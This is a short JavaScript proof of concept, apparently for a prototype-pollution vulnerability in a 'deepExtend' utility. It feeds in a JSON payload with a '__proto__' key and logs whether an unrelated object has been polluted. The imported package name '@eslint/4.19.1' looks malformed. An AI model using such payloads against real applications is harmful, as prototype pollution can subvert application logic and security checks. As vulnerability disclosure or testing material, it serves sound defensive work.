const utils = require('@eslint/4.19.1');

const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepExtend({}, source);
// utils.deepCopy(source);
console.log("After : " + obj.polluted);